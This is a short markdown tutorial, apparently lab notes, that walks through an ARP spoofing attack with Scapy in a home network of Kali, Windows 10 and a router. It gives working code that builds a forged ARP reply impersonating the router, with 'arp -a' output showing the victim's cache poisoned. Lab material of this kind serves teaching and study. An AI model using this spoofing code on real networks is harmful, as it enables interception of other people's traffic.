# ARP SPOOFING

- ## some variables

```
BROADCAST_MAC: ff:ff:ff:ff:ff:ff

KALI_IP      : 192.168.1.195
KALI_MAC     : ka:li:ma:c0:ad:dr

W10_IP       : 192.168.1.10
W10_MAC      : w1:00:ma:c0:ad:dr

ROUTER_IP    : 192.168.1.254
ROUTER_MAC   : ro:ut:er:0m:ac:00
```

- create Ether layer
    ```
    broadcast = Ether(dst=BROADCAST_MAC)
    ```

- create ARP layer
    ```
    arp_layer = ARP(pdst=W10_IP)
    ```

- create ARP packet
    ```
    arp_packet = broadcast/arp_layer
    ```

- send ARP request ang get answered and unanswered lists
    ```
    answer, unanswer = srp(arp_packet, timeout=2, verbose=True)
    ```

- get sent and received layers fromn answer
    ```
    sent, received = answer[0]
    ```

- get target mac address
    ```
    target_mac = received.hwsrc # W10_MAC
    ```

- create spoofing packet
    ```
    packet = ARP(op=2, hwdst=W10_MAC, pdst=W10_IP, psrc=ROUTER_IP)
    ```

- check arp
    ```
    C:\>arp -a | findstr "192.168.1.195 192.168.1.254"
      192.168.1.195         ka:li:ma:c0:ad:dr     dynamic
      192.168.1.254         ro:ut:er:0m:ac:00     dynamic
    ```

- send spoof packet
    ```
    send(packet, verbose=False)
    ```
- check again arp 
    ```
    C:\>arp -a | findstr "192.168.1.195 192.168.1.254"
      192.168.1.195         ka:li:ma:c0:ad:dr     dynamic
      192.168.1.254         ka:li:ma:c0:ad:dr     dynamic
    ```
